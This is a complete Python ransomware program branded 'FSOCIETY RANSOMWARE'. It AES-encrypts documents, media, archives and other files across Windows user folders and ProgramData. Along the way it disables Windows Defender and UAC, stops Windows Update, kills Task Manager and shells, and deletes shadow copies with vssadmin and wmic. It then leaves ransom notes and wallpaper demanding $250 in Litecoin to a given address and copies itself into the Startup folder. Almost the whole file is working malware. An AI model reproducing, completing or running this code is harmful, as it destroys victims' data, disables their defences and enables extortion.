import os
import base64
import ctypes
import subprocess
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import winreg
import time
import shutil
import re

# Configuration
LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
RANSOM_AMOUNT = "$250 USD in Litecoin"
DECRYPT_KEY = "agent77"

def fullscreen_cmd():
    """Open fullscreen command prompt with red text"""
    try:
        # Create fullscreen cmd with red text
        os.system('mode con: cols=120 lines=40')
        os.system('color 4F')
        # Maximize window
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        ctypes.windll.user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE
    except:
        pass

def fsociety_ui():
    """Display fsociety ASCII art and status"""
    os.system('cls')
    banner = r'''
   ______   ______   ______   ______   ______   ______   ______   ______
  /\  == \ /\  ___\ /\  ___\ /\  == \ /\  ___\ /\  ___\ /\  ___\ /\  __ \
  \ \  __< \ \  __\ \ \  __\ \ \  __< \ \  __\ \ \  __\ \ \  __\ \ \  __/
   \ \_\ \_\ \ \_____\ \_____\ \ \_\ \_\ \_____\ \ \_____\ \ \_____\ \ \_\
    \/_/ /_/  \/_____/ \/_____/ \/_/ /_/ \/_____/ \/_____/ \/_____/ \/_/
  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.
  | F |  | S |  | O |  | C |  | I |  | E |  | T |  | Y |  | 2 |  | . |  | 0 |
  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'
    '''
    print(banner)
    print("\n" + "="*80)
    print("           [*] FSOCIETY RANSOMWARE v2.9.0 [*]".center(80))
    print("="*80)
    print("\n[+] Initializing encryption sequence...")
    print("[+] Disabling security protocols...")
    print("[+] Deleting shadow copies...")
    print("[+] Encrypting files...\n")

def generate_key():
    return get_random_bytes(32)

def generate_iv():
    return get_random_bytes(16)

def encrypt_file(file_path, key, iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        with open(file_path, 'wb') as f:
            f.write(iv + encrypted_data)
        return True
    except:
        return False

def decrypt_file(file_path, key, iv):
    try:
        with open(file_path, 'rb') as f:
            iv_data = f.read(16)
            encrypted_data = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv_data)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        original_path = file_path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(file_path)
        return True
    except:
        return False

def encrypt_directory(directory, key, iv, extensions=None):
    if extensions is None:
        extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
            '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd',
            '.mp3', '.wav', '.flac', '.aac', '.ogg',
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
            '.exe', '.dll', '.msi', '.apk', '.app', '.deb', '.rpm',
            '.php', '.html', '.htm', '.css', '.js', '.py', '.cpp', '.c',
            '.java', '.class', '.jar', '.sql', '.db', '.mdb', '.accdb',
            '.ps1', '.bat', '.cmd', '.sh', '.bash',
            '.ai', '.eps', '.svg', '.indd', '.cdr', '.dxf', '.dwg',
            '.iso', '.img', '.vhd', '.vmdk', '.ova', '.ovf',
            '.pst', '.ost', '.msg', '.eml', '.mdb', '.nsf'
        ]
    
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            ext = os.path.splitext(file)[1].lower()
            if ext in extensions and not file.endswith('.encrypted'):
                if encrypt_file(file_path, key, iv):
                    count += 1
                    # Show progress
                    if count % 10 == 0:
                        sys.stdout.write(f"\r[+] Encrypted: {count} files...")
                        sys.stdout.flush()
                try:
                    os.rename(file_path, file_path + '.encrypted')
                except:
                    pass
    return count

def decrypt_all_files(key, iv):
    count = 0
    for directory in get_target_directories():
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.encrypted'):
                    file_path = os.path.join(root, file)
                    if decrypt_file(file_path, key, iv):
                        count += 1
    return count

def get_target_directories():
    user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
    paths = [
        user_profile + '\\Desktop',
        user_profile + '\\Documents',
        user_profile + '\\Downloads',
        user_profile + '\\Pictures',
        user_profile + '\\Music',
        user_profile + '\\Videos',
        user_profile + '\\AppData\\Local',
        user_profile + '\\AppData\\Roaming',
        user_profile + '\\Favorites',
        user_profile + '\\OneDrive',
        'C:\\ProgramData',
        'C:\\Users\\Public\\Documents',
        'C:\\Users\\Public\\Desktop'
    ]
    return [p for p in paths if os.path.exists(p)]

def disable_security():
    try:
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableArchiveScanning $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', shell=True, capture_output=True)
        try:
            key = winreg.HKEY_LOCAL_MACHINE
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(handle)
        except:
            pass
        subprocess.run('net stop wuauserv', shell=True, capture_output=True)
        subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True)
        subprocess.run('taskkill /f /im Taskmgr.exe 2>nul', shell=True)
        subprocess.run('taskkill /f /im regedit.exe 2>nul', shell=True)
        subprocess.run('taskkill /f /im cmd.exe 2>nul', shell=True)
        subprocess.run('taskkill /f /im powershell.exe 2>nul', shell=True)
    except:
        pass

def delete_shadow_copies():
    try:
        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, capture_output=True)
        subprocess.run('wmic shadowcopy delete', shell=True, capture_output=True)
    except:
        pass

def change_wallpaper():
    try:
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (1920, 1080), color='black')
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("arial.ttf", 72)
            font2 = ImageFont.truetype("arial.ttf", 48)
            font3 = ImageFont.truetype("arial.ttf", 30)
            font4 = ImageFont.truetype("arial.ttf", 24)
        except:
            font = ImageFont.load_default()
            font2 = ImageFont.load_default()
            font3 = ImageFont.load_default()
            font4 = ImageFont.load_default()
        
        # fsociety logo
        text = "F SOCIETY\nYOUR FILES ARE ENCRYPTED"
        draw.text((100, 300), text, fill=(255, 0, 0), font=font)
        draw.text((100, 550), "Pay $250 in Litecoin", fill=(255, 255, 255), font=font2)
        draw.text((100, 650), "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz", fill=(0, 255, 0), font=font3)
        draw.text((100, 750), "To decrypt, run: python ransomware.py --decrypt agent77", fill=(255, 255, 0), font=font3)
        draw.text((100, 850), "You have 72 hours. Don't contact law enforcement.", fill=(255, 255, 255), font=font4)
        
        wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
        img.save(wallpaper_path)
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
        
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Control Panel\Desktop"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "Wallpaper", 0, winreg.REG_SZ, wallpaper_path)
        winreg.SetValueEx(handle, "WallpaperStyle", 0, winreg.REG_SZ, "2")
        winreg.SetValueEx(handle, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(handle)
    except:
        pass

def create_ransom_note(key_hex, iv_hex):
    note = f"""
=============================================================
          F SOCIETY RANSOMWARE - AES-256 ENCRYPTION
=============================================================

Your files have been encrypted with AES-256-CBC.

To recover your files, pay $250 USD in Litecoin to:

Litecoin Address: LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz

IMPORTANT:
- You have 72 hours to pay
- After 72 hours, the key will be destroyed

DECRYPTION KEY (DO NOT LOSE):
Key: {key_hex}
IV:  {iv_hex}

TO DECRYPT:
Run the following command:
python ransomware.py --decrypt agent77

=============================================================
            F SOCIETY - WE ARE EVERYWHERE
=============================================================
"""
    desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
    with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
        f.write(note)
    for dir_path in get_target_directories():
        try:
            with open(dir_path + '\\README_FSOCIETY.txt', 'w') as f:
                f.write(note)
        except:
            pass

def show_popup():
    ctypes.windll.user32.MessageBoxW(0, 
        "YOUR FILES HAVE BEEN ENCRYPTED BY F SOCIETY\n\n"
        "Pay $250 in Litecoin to:\nLdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz\n\n"
        "Decryption key: agent77\n"
        "Run: python ransomware.py --decrypt agent77\n\n"
        "Read the ransom note on your Desktop.", 
        "F SOCIETY RANSOMWARE", 
        0x10 | 0x1)

def main():
    # Fullscreen UI
    fullscreen_cmd()
    fsociety_ui()
    
    if len(sys.argv) >= 3 and sys.argv[1] == '--decrypt':
        if sys.argv[2] == DECRYPT_KEY:
            try:
                desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
                with open(desktop + '\\README_FSOCIETY.txt', 'r') as f:
                    content = f.read()
                    key_match = re.search(r'Key: (\S+)', content)
                    iv_match = re.search(r'IV: (\S+)', content)
                    if key_match and iv_match:
                        key = base64.b64decode(key_match.group(1))
                        iv = base64.b64decode(iv_match.group(1))
                        count = decrypt_all_files(key, iv)
                        print(f"\n[+] DECRYPTION COMPLETE! {count} files restored.")
                        ctypes.windll.user32.MessageBoxW(0, 
                            f"DECRYPTION COMPLETE!\n{count} files restored.",
                            "F SOCIETY", 0x40)
                        time.sleep(3)
                        sys.exit(0)
            except:
                pass
        else:
            ctypes.windll.user32.MessageBoxW(0, 
                "Invalid decryption key!",
                "F SOCIETY", 0x10)
            sys.exit(1)
    
    # Encryption mode
    try:
        key = generate_key()
        iv = generate_iv()
        key_hex = base64.b64encode(key).decode()
        iv_hex = base64.b64encode(iv).decode()
        
        print("[+] Disabling security...")
        disable_security()
        
        print("[+] Deleting shadow copies...")
        delete_shadow_copies()
        
        print("[+] Encrypting files...")
        total_encrypted = 0
        for directory in get_target_directories():
            try:
                count = encrypt_directory(directory, key, iv)
                total_encrypted += count
                print(f"\n[+] Encrypted {count} files in {directory}")
            except:
                pass
        
        print(f"\n[+] Total files encrypted: {total_encrypted}")
        
        print("[+] Changing wallpaper...")
        change_wallpaper()
        
        print("[+] Creating ransom note...")
        create_ransom_note(key_hex, iv_hex)
        
        print("[+] Done! Showing popup...")
        show_popup()
        
        try:
            startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
            print("[+] Added to startup.")
        except:
            pass
        
        print("\n[+] Press any key to exit...")
        os.system('pause >nul')
        
    except Exception as e:
        print(f"[-] Error: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()
